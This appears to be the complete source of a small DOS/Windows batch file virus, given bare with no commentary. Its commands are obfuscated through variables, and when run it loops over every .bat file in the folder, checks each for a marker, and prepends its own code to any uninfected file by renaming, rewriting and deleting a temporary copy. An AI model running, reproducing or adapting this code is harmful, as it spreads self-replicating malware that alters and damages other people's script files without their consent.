@echo off%CW%
set var1=bat
set var2=find
set var3=errorlevel
set var4=exist
set var5=type
set var6=goto
set var7=call
set var8=not
set var9=if
set vara=ren
set varb=del
set varc=vir
set vard=tmp
set vare=do
set varf=nul
set varg=for
set varh=in
%var9% '%1' == '' %var6% b
%var2% "%id%" <%1 >%varf%
%var9% %var8% %var3% 1 %var6% c
%var9% %var4% %0.bat %var6% a
%vara% %1 %varc%.%vard%
%var5% %0 >%1
%var5% %varc%.%vard% >>%1
%varb% %varc%.%vard%
%var6% c
:a
%vara% %1 %varc%.%vard%
%var5% %0.%var1% >%1
%var5% %varc%.%vard% >>%1
%varb% %varc%.%vard%
%var6% c
:b
%varg% %%a %varh% (*.%var1%) %vare% %var7% %0 %%a
:c
